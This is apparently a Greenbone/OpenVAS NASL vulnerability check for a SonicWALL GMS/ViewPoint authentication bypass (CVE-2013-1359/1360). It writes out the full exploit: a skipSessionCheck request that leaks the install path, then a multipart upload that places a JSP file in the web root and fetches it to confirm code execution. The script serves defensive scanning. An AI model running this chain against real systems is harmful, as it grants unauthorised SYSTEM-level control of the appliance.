if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103642" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_bugtraq_id( 57445 );
	script_cve_id( "CVE-2013-1359", "CVE-2013-1360" );
	script_version( "2021-07-01T11:00:40+0000" );
	script_name( "Multiple SonicWALL Products Authentication Bypass Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/57445" );
	script_xref( name: "URL", value: "http://www.sonicwall.com/" );
	script_xref( name: "URL", value: "http://sotiriu.de/adv/NSOADV-2013-001.txt" );
	script_tag( name: "last_modification", value: "2021-07-01 11:00:40 +0000 (Thu, 01 Jul 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2020-02-14 18:13:00 +0000 (Fri, 14 Feb 2020)" );
	script_tag( name: "creation_date", value: "2013-01-18 13:01:11 +0100 (Fri, 18 Jan 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Vendor updates are available. Please see the references for more
  information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Multiple SonicWALL products including Global Management System (GMS),
  ViewPoint, Universal Management Appliance (UMA), and Analyzer are
  prone to an authentication-bypass vulnerability." );
	script_tag( name: "impact", value: "Attackers can exploit this issue to gain administrative access to the
  web interface. This allows attackers to execute arbitrary code with SYSTEM privileges that could fully
  compromise the system." );
	script_tag( name: "affected", value: "GMS/Analyzer/UMA 7.0.x

  GMS/ViewPoint/UMA 6.0.x

  GMS/ViewPoint/UMA 5.1.x

  GMS/ViewPoint 5.0.x

  GMS/ViewPoint 4.1.x" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
url = "/";
buf = http_get_cache( item: url, port: port );
if(!buf || !ContainsString( tolower( buf ), "<title>sonicwall" )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
req = NASLString( "POST /appliance/applianceMainPage?skipSessionCheck=1 HTTP/1.1\\r\\n", "TE: deflate,gzip;q=0.3\\r\\n", "Connection: TE, close\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Length: 90\\r\\n", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\\r\\n", "\\r\\n", "num=123456&action=show_diagnostics&task=search&item=application_log&criteria=*.*&width=500\\r\\n" );
result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!ContainsString( result, "<OPTION VALUE" )){
	exit( 0 );
}
lines = split( result );
for line in lines {
	if(ContainsString( line, "<OPTION VALUE" )){
		a = split( buffer: line, sep: "\"", keep: FALSE );
		if(ContainsString( a[1], "logs" )){
			b = split( buffer: a[1], sep: "logs", keep: FALSE );
			gms_path = b[0];
			if(!isnull( gms_path )){
				break;
			}
		}
	}
}
if(isnull( gms_path )){
	exit( 0 );
}
if( IsMatchRegexp( gms_path, "^/" ) ){
	gms_path = gms_path + "webapps/appliance/";
}
else {
	gms_path = gms_path + "webapps\\appliance\\";
}
vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + ".jsp";
jsp_print = vtstrings["lowercase_rand"];
jsp = "<% out.println( \"" + jsp_print + "\" ); %>";
len = 325 + strlen( jsp ) + strlen( gms_path ) + strlen( file );
req = NASLString( "POST /appliance/applianceMainPage?skipSessionCheck=1 HTTP/1.1\\r\\n", "TE: deflate,gzip;q=0.3\\r\\n", "Connection: TE, close\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Length: ", len, "\\r\\n", "Content-Type: multipart/form-data; boundary=xYzZY\\r\\n", "\\r\\n", "--xYzZY\\r\\n", "Content-Disposition: form-data; name=\"action\"", "\\r\\n", "\\r\\n", "file_system\\r\\n", "--xYzZY\\r\\n", "Content-Disposition: form-data; name=\"task\"", "\\r\\n", "\\r\\n", "uploadFile\\r\\n", "--xYzZY\\r\\n", "Content-Disposition: form-data; name=\"searchFolder\"", "\\r\\n", "\\r\\n", gms_path, "\\r\\n", "--xYzZY\\r\\n", "Content-Disposition: form-data; name=\"uploadFileName\"; filename=\"", file, "\"", "\\r\\n", "Content-Type: text/plain\\r\\n", "\\r\\n", jsp, "\\r\\n", "\\r\\n", "--xYzZY--\\r\\n" );
result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!result || !IsMatchRegexp( result, "^HTTP/1\\.[01] 200" )){
	exit( 0 );
}
url = "/appliance/" + file;
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( buf, jsp_print )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

